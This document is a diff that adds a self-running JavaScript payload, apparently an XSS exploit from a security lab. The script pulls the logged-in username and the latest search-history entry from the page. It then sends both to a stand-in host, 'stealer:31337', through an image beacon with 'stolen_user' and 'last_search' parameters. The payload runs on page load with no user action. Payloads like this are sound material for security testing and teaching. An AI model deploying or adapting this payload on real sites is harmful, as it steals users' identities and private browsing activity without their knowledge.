@@ -1,0 +1,52 @@
+<script>
+(function(){
+  const strip = s=> (s||'').replace(/^[\s"']+|[\s"'\.\,\;\:\!\?]+$/g,'');
+  const looksLikeSearch = s=>{
+    if(!s) return false;
+    if(/<|%3C|%3E|\\u003c|script|function|=|http:|https:|%0A|%0D/i.test(s)) return false;
+    // require at least one alnum word
+    return /[A-Za-z0-9]/.test(s);
+  };
+
+  function getUsername(){
+    // element-first
+    const el = document.querySelector('.username, .user, #user, [data-username]');
+    if(el && el.textContent.trim()){
+      return strip(el.textContent.trim());
+    }
+    // fallback to text scan and strip punctuation
+    const m = (document.body && document.body.innerText || '').match(/Logged in as\s+([^\n]+)/i);
+    if(m && m[1]) return strip(m[1]);
+    return '';
+  }
+
+  function getLastSearch(){
+    // prefer history item links
+    const candidates = document.querySelectorAll('.history-item, #history-list .history-item, #history-list a, .search-history a, .history a, .history li');
+    for(const n of candidates){
+      const t = (n.textContent||'').trim();
+      if(looksLikeSearch(t)) return t.split(/\r?\n/)[0].trim();
+    }
+    // fallback: scan plain lines after a "Search History" header
+    const lines = (document.body && document.body.innerText || '').split(/\r?\n/).map(s=>s.trim()).filter(Boolean);
+    const idx = lines.findIndex(l=>/search history/i.test(l));
+    if(idx>=0){
+      for(let i=idx+1;i<lines.length;i++){
+        if(looksLikeSearch(lines[i])) return lines[i];
+      }
+    }
+    return '';
+  }
+  const attemptSend = ()=>{
+    const uname = getUsername();
+    const last = getLastSearch();
+    console.log('exfil test ->', {uname,last});
+    const u = encodeURIComponent(uname||'');
+    const s = encodeURIComponent(last||'');
+    new Image().src = 'http://stealer:31337/?stolen_user='+u+'&last_search='+s;
+  };
+
+  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', ()=>{ setTimeout(attemptSend,200); }, {once:true});
+  else setTimeout(attemptSend,200);
+})();
+</script>
